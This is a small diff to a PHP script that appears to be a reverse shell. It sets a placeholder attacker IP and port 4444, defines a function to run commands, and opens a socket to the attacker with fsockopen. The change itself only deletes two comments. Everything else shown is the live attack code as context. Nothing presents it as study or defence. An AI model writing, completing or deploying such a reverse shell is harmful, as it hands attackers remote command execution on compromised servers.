@@ -3,7 +3,6 @@
 $attacker_ip = 'ATTACKER_IP'; // Replace with the IP address of the attacker's machine
 $attacker_port = 4444; // Replace with the port you want to use
 
-// Function to execute commands
 function execute_command($command) {
     $output = [];
     $return_var = 0;
@@ -11,7 +10,6 @@ function execute_command($command) {
     return [$return_var, implode("\n", $output)];
 }
 
-// Establish socket connection
 $sock = fsockopen($attacker_ip, $attacker_port, $errno, $errstr, 30);
 if (!$sock) {
     die("Socket connection failed: $errstr ($errno)\n");
